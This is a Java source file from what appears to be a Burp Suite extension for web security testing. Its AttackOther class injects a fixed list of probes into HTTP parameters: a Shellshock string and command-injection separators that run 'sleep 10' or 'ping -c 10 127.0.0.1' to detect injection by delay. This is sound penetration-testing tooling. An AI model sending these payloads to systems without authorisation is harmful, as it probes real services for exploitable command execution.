/*
 * Copyright (C) 2015 DobinRutishauser@broken.ch
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package attacks;

import gui.botLeft.PanelLeftInsertions;
import gui.categorizer.model.ResponseCategory;
import gui.networking.AttackWorkEntry;
import model.SentinelHttpMessage;
import model.SentinelHttpMessageAtk;
import util.BurpCallbacks;
import util.ConnectionTimeoutException;
import util.Utility;

/**
 *
 * @author DobinRutishauser@broken.ch
 */
public class AttackOther extends AttackI {
    private boolean doContinue = false;
    private int state = 0;
    private SentinelHttpMessageAtk lastHttpMessage = null;
    
    private final String[] attackDataOther = {
        ".\\",
        "./",
        "() { :;}; sleep 10",
        "%00",
        ";sleep 10",
        "\" ;sleep 10",
        "';sleep 10",
        "|sleep 10",
        "& ping -c 10 127.0.0.1",
        "\" & ping -c 10 127.0.0.1",
        "' & ping -c 10 127.0.0.1",
    };
    
       // return attack string
    // Also sets "doContinue"
    // Oh my god this is ugly
    private String getData(AttackWorkEntry attackWorkEntry) {
        String data;

        boolean onlyUrlencoded;
        if (attackWorkEntry.attackHttpParam.getTypeStr().equals("GET") 
                || attackWorkEntry.attackHttpParam.getTypeStr().equals("PATH")) 
        {
            onlyUrlencoded = true;
        } else {
            onlyUrlencoded = false;
        }

        if (onlyUrlencoded) {
            data = attackDataOther[state];
            data = Utility.realUrlEncode(data);
                
            if (state < attackDataOther.length - 1) {
                doContinue = true;
            } else {
                doContinue = false;
            }
        } else {
            if (state < attackDataOther.length) {                
                data = attackDataOther[state];
                data = Utility.realUrlEncode(data);
            
                doContinue = true;
            } else {
                int newState = state - attackDataOther.length;
                            
                data = attackDataOther[newState];
                
                if (newState < attackDataOther.length - 1) {
                    doContinue = true;
                } else {
                    doContinue = false;
                }
            }
        }
        
        return data;
    }
    
    public AttackOther(AttackWorkEntry work) {
        super(work);
    }
    
    private SentinelHttpMessage attack(String data) throws ConnectionTimeoutException {
        SentinelHttpMessageAtk httpMessage = initAttackHttpMessage(data);
        if (httpMessage == null) {
            return null;
        }
        lastHttpMessage = httpMessage;
        BurpCallbacks.getInstance().sendRessource(httpMessage, attackWorkEntry.followRedirect);

        AttackResult res = new AttackResult(
            AttackData.AttackType.NONE, 
            "OTHER" + state, 
            httpMessage.getReq().getChangeParam(), 
            false,
            null);
        httpMessage.addAttackResult(res);
        
        return httpMessage;
    }
    
    @Override
    public boolean performNextAttack() {
        String data;
        
        // Hack - should be in payload definition
        if (state == 0 || state == 1) {
            attackWorkEntry.insertPosition = PanelLeftInsertions.InsertPositions.LEFT;
        } else if (state == 2) {
            attackWorkEntry.insertPosition = PanelLeftInsertions.InsertPositions.REPLACE;
        } else {
            attackWorkEntry.insertPosition = PanelLeftInsertions.InsertPositions.RIGHT;
        }
        
        data = getData(attackWorkEntry);
        
        try {
            SentinelHttpMessage httpMessage = attack(data);
            if (httpMessage == null) {
                return false;
            }
        } catch (ConnectionTimeoutException ex) {
            BurpCallbacks.getInstance().print("Connection timeout");
            state++;
            return false;
        }
        
        state++;
        return doContinue;    
    }

    @Override
    public SentinelHttpMessageAtk getLastAttackMessage() {
        return lastHttpMessage;
    }

    @Override
    public boolean init() {
        return true;
    }
    
}
